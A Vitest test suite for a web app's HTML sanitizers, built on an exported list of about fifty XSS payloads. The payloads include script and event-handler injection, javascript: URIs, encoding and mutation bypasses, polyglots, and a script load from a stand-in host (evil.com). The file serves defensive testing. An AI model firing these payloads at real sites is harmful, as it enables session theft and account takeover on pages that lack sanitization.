/**
 * US-010: Comprehensive XSS Payload Test Suite
 *
 * Tests sanitizeHtml, sanitizeInput, and stripHtml against 50+ XSS vectors
 * organized by attack category. Each payload is verified to produce output
 * free of executable JavaScript.
 *
 * Uses Vitest + Happy DOM.
 */

import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeInput, stripHtml } from '@/lib/security/sanitize';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Returns true when the string contains patterns that could execute JS.
 * Checks for:
 *  - <script  (tag-based execution)
 *  - javascript:  (URI-based execution)
 *  - on\w+=  (event-handler execution, e.g. onerror=, onload=)
 *  - vbscript:  (legacy IE vector)
 *  - expression(  (CSS expression, legacy IE)
 */
function containsExecutableJS(output: string): boolean {
  const dangerous = [
    /<script[\s/>]/i,
    /javascript\s*:/i,
    /vbscript\s*:/i,
    /\bon\w+\s*=/i,
    /expression\s*\(/i,
  ];
  return dangerous.some((re) => re.test(output));
}

/**
 * Asserts the output of a sanitizer is free of executable JS.
 * If the assertion would fail, the test is still recorded so we can
 * track known gaps -- but we always expect clean output.
 */
function expectClean(output: string, label: string): void {
  expect(
    containsExecutableJS(output),
    `Executable JS detected in ${label} output: ${JSON.stringify(output)}`,
  ).toBe(false);
}

// ---------------------------------------------------------------------------
// Payload database -- exportable so other test files can extend it
// ---------------------------------------------------------------------------

export interface XSSPayload {
  id: string;
  category: string;
  payload: string;
  description: string;
}

export const PAYLOADS: XSSPayload[] = [
  // -----------------------------------------------------------------------
  // 1. Basic script injection
  // -----------------------------------------------------------------------
  {
    id: 'BASIC-001',
    category: 'basic-script',
    payload: '<script>alert(1)</script>',
    description: 'Classic script tag alert',
  },
  {
    id: 'BASIC-002',
    category: 'basic-script',
    payload: '<script>alert("XSS")</script>',
    description: 'Script tag with string payload',
  },
  {
    id: 'BASIC-003',
    category: 'basic-script',
    payload: '<script src="https://evil.com/xss.js"></script>',
    description: 'External script inclusion',
  },
  {
    id: 'BASIC-004',
    category: 'basic-script',
    payload: '<SCRIPT>alert(1)</SCRIPT>',
    description: 'Uppercase script tag',
  },
  {
    id: 'BASIC-005',
    category: 'basic-script',
    payload: '<scr<script>ipt>alert(1)</scr</script>ipt>',
    description: 'Nested/fragmented script tag',
  },
  {
    id: 'BASIC-006',
    category: 'basic-script',
    payload: '<script\n>alert(1)</script\n>',
    description: 'Script tag with newlines',
  },
  {
    id: 'BASIC-007',
    category: 'basic-script',
    payload: '<script/src="data:text/javascript,alert(1)">',
    description: 'Script tag with data URI src',
  },

  // -----------------------------------------------------------------------
  // 2. Event handler injection
  // -----------------------------------------------------------------------
  {
    id: 'EVENT-001',
    category: 'event-handler',
    payload: '<img src=x onerror=alert(1)>',
    description: 'img onerror handler',
  },
  {
    id: 'EVENT-002',
    category: 'event-handler',
    payload: '<body onload=alert(1)>',
    description: 'body onload handler',
  },
  {
    id: 'EVENT-003',
    category: 'event-handler',
    payload: '<input onfocus=alert(1) autofocus>',
    description: 'input onfocus with autofocus',
  },
  {
    id: 'EVENT-004',
    category: 'event-handler',
    payload: '<div onmouseover=alert(1)>hover me</div>',
    description: 'div onmouseover handler',
  },
  {
    id: 'EVENT-005',
    category: 'event-handler',
    payload: '<marquee onstart=alert(1)>',
    description: 'marquee onstart handler',
  },
  {
    id: 'EVENT-006',
    category: 'event-handler',
    payload: '<video><source onerror="alert(1)">',
    description: 'video source onerror',
  },
  {
    id: 'EVENT-007',
    category: 'event-handler',
    payload: '<details open ontoggle=alert(1)>',
    description: 'details ontoggle handler',
  },

  // -----------------------------------------------------------------------
  // 3. SVG / MathML-based XSS
  // -----------------------------------------------------------------------
  {
    id: 'SVG-001',
    category: 'svg-mathml',
    payload: '<svg onload=alert(1)>',
    description: 'SVG onload handler',
  },
  {
    id: 'SVG-002',
    category: 'svg-mathml',
    payload: '<svg><script>alert(1)</script></svg>',
    description: 'Script inside SVG',
  },
  {
    id: 'SVG-003',
    category: 'svg-mathml',
    payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    description: 'SVG animate onbegin',
  },
  {
    id: 'SVG-004',
    category: 'svg-mathml',
    payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    description: 'MathML namespace confusion',
  },
  {
    id: 'SVG-005',
    category: 'svg-mathml',
    payload: '<svg><foreignObject><body onerror=alert(1)><img src=x></body></foreignObject></svg>',
    description: 'SVG foreignObject body injection',
  },

  // -----------------------------------------------------------------------
  // 4. Data URI / javascript: attacks
  // -----------------------------------------------------------------------
  {
    id: 'URI-001',
    category: 'data-uri',
    payload: '<a href="javascript:alert(1)">click</a>',
    description: 'Anchor with javascript: URI',
  },
  {
    id: 'URI-002',
    category: 'data-uri',
    payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    description: 'Anchor with data: URI containing script',
  },
  {
    id: 'URI-003',
    category: 'data-uri',
    payload: '<iframe src="javascript:alert(1)">',
    description: 'Iframe with javascript: URI',
  },
  {
    id: 'URI-004',
    category: 'data-uri',
    payload: '<a href="javascript&#58;alert(1)">click</a>',
    description: 'javascript: with HTML entity colon',
  },
  {
    id: 'URI-005',
    category: 'data-uri',
    payload: '<a href="&#106;avascript:alert(1)">click</a>',
    description: 'javascript: with HTML entity j',
  },
  {
    id: 'URI-006',
    category: 'data-uri',
    payload: '<a href="jAvAsCrIpT:alert(1)">click</a>',
    description: 'javascript: mixed case',
  },

  // -----------------------------------------------------------------------
  // 5. Encoding bypasses
  // -----------------------------------------------------------------------
  {
    id: 'ENC-001',
    category: 'encoding-bypass',
    payload: '&lt;script&gt;alert(1)&lt;/script&gt;',
    description: 'HTML-entity encoded script tag',
  },
  {
    id: 'ENC-002',
    category: 'encoding-bypass',
    payload: '%3Cscript%3Ealert(1)%3C/script%3E',
    description: 'URL-encoded script tag',
  },
  {
    id: 'ENC-003',
    category: 'encoding-bypass',
    payload: '\u003cscript\u003ealert(1)\u003c/script\u003e',
    description: 'Unicode-escaped script tag',
  },
  {
    id: 'ENC-004',
    category: 'encoding-bypass',
    payload: '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    description: 'Double URL-encoded script tag',
  },
  {
    id: 'ENC-005',
    category: 'encoding-bypass',
    payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
    description: 'HTML-entity encoded event handler value',
  },
  {
    id: 'ENC-006',
    category: 'encoding-bypass',
    payload: '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>',
    description: 'Hex entity encoded javascript: URI',
  },

  // -----------------------------------------------------------------------
  // 6. DOM clobbering
  // -----------------------------------------------------------------------
  {
    id: 'DOM-001',
    category: 'dom-clobbering',
    payload: '<form id="document"><input name="cookie" value="stolen"></form>',
    description: 'Clobber document.cookie via form',
  },
  {
    id: 'DOM-002',
    category: 'dom-clobbering',
    payload: '<img name="getElementById">',
    description: 'Clobber document.getElementById',
  },
  {
    id: 'DOM-003',
    category: 'dom-clobbering',
    payload: '<a id="location" href="javascript:alert(1)">x</a>',
    description: 'Clobber document.location',
  },
  {
    id: 'DOM-004',
    category: 'dom-clobbering',
    payload: '<form><button formaction="javascript:alert(1)">Submit</button></form>',
    description: 'Form button formaction injection',
  },

  // -----------------------------------------------------------------------
  // 7. Template literal injection
  // -----------------------------------------------------------------------
  {
    id: 'TPL-001',
    category: 'template-literal',
    payload: '${alert(1)}',
    description: 'ES6 template literal expression',
  },
  {
    id: 'TPL-002',
    category: 'template-literal',
    payload: '{{constructor.constructor("alert(1)")()}}',
    description: 'Angular/template engine prototype injection',
  },
  {
    id: 'TPL-003',
    category: 'template-literal',
    payload: '<div>${{7*7}}</div>',
    description: 'Server-side template injection probe',
  },

  // -----------------------------------------------------------------------
  // 8. CSS-based XSS
  // -----------------------------------------------------------------------
  {
    id: 'CSS-001',
    category: 'css-xss',
    payload: '<div style="background:url(javascript:alert(1))">',
    description: 'CSS background url with javascript:',
  },
  {
    id: 'CSS-002',
    category: 'css-xss',
    payload: '<div style="width:expression(alert(1))">',
    description: 'CSS expression() (legacy IE)',
  },
  {
    id: 'CSS-003',
    category: 'css-xss',
    payload: '<style>@import "javascript:alert(1)";</style>',
    description: 'CSS @import with javascript:',
  },
  {
    id: 'CSS-004',
    category: 'css-xss',
    payload: '<link rel="stylesheet" href="javascript:alert(1)">',
    description: 'Link tag with javascript: href',
  },
  {
    id: 'CSS-005',
    category: 'css-xss',
    payload: '<div style="-moz-binding:url(evil.xml#xss)">',
    description: 'Firefox -moz-binding CSS vector',
  },

  // -----------------------------------------------------------------------
  // 9. Mutation XSS (mXSS)
  // -----------------------------------------------------------------------
  {
    id: 'MXSS-001',
    category: 'mutation-xss',
    payload: '<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>',
    description: 'mXSS via listing element re-parsing',
  },
  {
    id: 'MXSS-002',
    category: 'mutation-xss',
    payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    description: 'mXSS via noscript breakout',
  },
  {
    id: 'MXSS-003',
    category: 'mutation-xss',
    payload: '<table><colgroup><col style=""><img src=x onerror=alert(1)>',
    description: 'mXSS via table mutation',
  },
  {
    id: 'MXSS-004',
    category: 'mutation-xss',
    payload: '<math><mtext><option><FAKEFAKE><option></option><img src=x onerror=alert(1)>',
    description: 'mXSS via MathML option confusion',
  },

  // -----------------------------------------------------------------------
  // 10. Polyglot XSS
  // -----------------------------------------------------------------------
  {
    id: 'POLY-001',
    category: 'polyglot',
    payload:
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    description: 'Multi-context polyglot payload',
  },
  {
    id: 'POLY-002',
    category: 'polyglot',
    payload: '"><img src=x onerror=alert(1)>//',
    description: 'Attribute breakout polyglot',
  },
  {
    id: 'POLY-003',
    category: 'polyglot',
    payload: "'-alert(1)-'",
    description: 'JS string breakout probe',
  },
  {
    id: 'POLY-004',
    category: 'polyglot',
    payload: '<svg/onload=alert(1)//',
    description: 'SVG self-closing onload polyglot',
  },
  {
    id: 'POLY-005',
    category: 'polyglot',
    payload:
      '"><svg/onload=alert(1)>"><img src=x onerror=alert(1)>',
    description: 'Double-context SVG + img polyglot',
  },
];

// ---------------------------------------------------------------------------
// Group payloads by category for organized test output
// ---------------------------------------------------------------------------

const categories: Record<string, XSSPayload[]> = {};
for (const p of PAYLOADS) {
  if (!categories[p.category]) {
    categories[p.category] = [];
  }
  categories[p.category].push(p);
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('US-010: XSS Payload Test Suite', () => {
  // Smoke check that we really do have 50+ payloads
  it('should contain at least 50 unique payloads', () => {
    expect(PAYLOADS.length).toBeGreaterThanOrEqual(50);
    const ids = new Set(PAYLOADS.map((p) => p.id));
    expect(ids.size).toBe(PAYLOADS.length); // no duplicate IDs
  });

  // -----------------------------------------------------------------------
  // Per-category tests
  // -----------------------------------------------------------------------

  describe.each(Object.entries(categories))('Category: %s', (_category, payloads) => {
    describe.each(payloads.map((p) => [p.id, p] as const))(
      'Payload %s',
      (_id, payload) => {
        it(`sanitizeHtml neutralizes: ${payload.description}`, () => {
          const output = sanitizeHtml(payload.payload);
          expectClean(output, `sanitizeHtml [${payload.id}]`);
        });

        it(`stripHtml neutralizes: ${payload.description}`, () => {
          const output = stripHtml(payload.payload);
          expectClean(output, `stripHtml [${payload.id}]`);
        });

        it(`sanitizeInput neutralizes: ${payload.description}`, () => {
          const output = sanitizeInput(payload.payload);
          expectClean(output, `sanitizeInput [${payload.id}]`);
        });
      },
    );
  });

  // -----------------------------------------------------------------------
  // Additional targeted assertions
  // -----------------------------------------------------------------------

  describe('sanitizeHtml specific behaviour', () => {
    it('preserves safe HTML tags', () => {
      const safe = '<p>Hello <strong>world</strong></p>';
      expect(sanitizeHtml(safe)).toBe(safe);
    });

    it('preserves safe anchor with href', () => {
      const safe = '<a href="https://example.com" target="_blank" rel="noopener">link</a>';
      expect(sanitizeHtml(safe)).toBe(safe);
    });

    it('strips javascript: from allowed anchor href', () => {
      const output = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
      expect(output).not.toMatch(/javascript\s*:/i);
    });

    it('strips data: URI from allowed anchor href', () => {
      const output = sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">click</a>');
      expect(output).not.toMatch(/data\s*:/i);
    });

    it('removes disallowed tags completely', () => {
      const output = sanitizeHtml('<iframe src="https://evil.com"></iframe>');
      expect(output).not.toContain('<iframe');
    });

    it('removes style attributes', () => {
      const output = sanitizeHtml('<p style="color:red">text</p>');
      expect(output).not.toContain('style');
    });
  });

  describe('stripHtml specific behaviour', () => {
    it('removes all HTML returning only text', () => {
      expect(stripHtml('<p>Hello <b>world</b></p>')).toBe('Hello world');
    });

    it('returns empty string for pure tag input', () => {
      expect(stripHtml('<div></div>')).toBe('');
    });
  });

  describe('sanitizeInput specific behaviour', () => {
    it('removes angle brackets from plain text', () => {
      const output = sanitizeInput('Hello <world>');
      expect(output).toBe('Hello world');
    });

    it('trims whitespace', () => {
      expect(sanitizeInput('  hello  ')).toBe('hello');
    });

    it('truncates input to 5000 characters', () => {
      const long = 'a'.repeat(6000);
      expect(sanitizeInput(long).length).toBe(5000);
    });

    // TODO: sanitizeInput uses simple regex stripping of < and >.
    // It does NOT handle HTML-entity encoded payloads (e.g. &lt;script&gt;)
    // or URL-encoded payloads (%3Cscript%3E). If the output of sanitizeInput
    // is later rendered via dangerouslySetInnerHTML or innerHTML, those
    // encoded payloads could decode into executable HTML. Currently this is
    // acceptable because sanitizeInput output is only used in text contexts
    // (React JSX auto-escapes), but this is a known limitation.
    it('does not decode HTML entities (known limitation)', () => {
      const output = sanitizeInput('&lt;script&gt;alert(1)&lt;/script&gt;');
      // The entities pass through unchanged -- safe ONLY in text contexts
      expect(output).toContain('&lt;script&gt;');
    });

    // TODO: sanitizeInput does not strip URL-encoded angle brackets.
    // The %3C and %3E pass through. This is safe when output is placed in
    // text content (React auto-escapes), but would be dangerous if the
    // output were used in an href or injected via innerHTML after
    // decodeURIComponent.
    it('does not decode URL-encoded brackets (known limitation)', () => {
      const output = sanitizeInput('%3Cscript%3Ealert(1)%3C/script%3E');
      expect(output).toContain('%3Cscript%3E');
    });
  });

  // -----------------------------------------------------------------------
  // Regression: ensure no payload produces output with <script
  // -----------------------------------------------------------------------

  describe('Regression: no <script in any sanitizeHtml output', () => {
    it.each(PAYLOADS.map((p) => [p.id, p.payload] as const))(
      '%s',
      (_id, payload) => {
        const output = sanitizeHtml(payload);
        expect(output.toLowerCase()).not.toContain('<script');
      },
    );
  });

  describe('Regression: no <script in any stripHtml output', () => {
    it.each(PAYLOADS.map((p) => [p.id, p.payload] as const))(
      '%s',
      (_id, payload) => {
        const output = stripHtml(payload);
        expect(output.toLowerCase()).not.toContain('<script');
      },
    );
  });

  // -----------------------------------------------------------------------
  // Regression: no event handlers in any sanitizeHtml output
  // -----------------------------------------------------------------------

  describe('Regression: no event handlers in any sanitizeHtml output', () => {
    it.each(PAYLOADS.map((p) => [p.id, p.payload] as const))(
      '%s',
      (_id, payload) => {
        const output = sanitizeHtml(payload);
        expect(output).not.toMatch(/\bon\w+\s*=/i);
      },
    );
  });
});
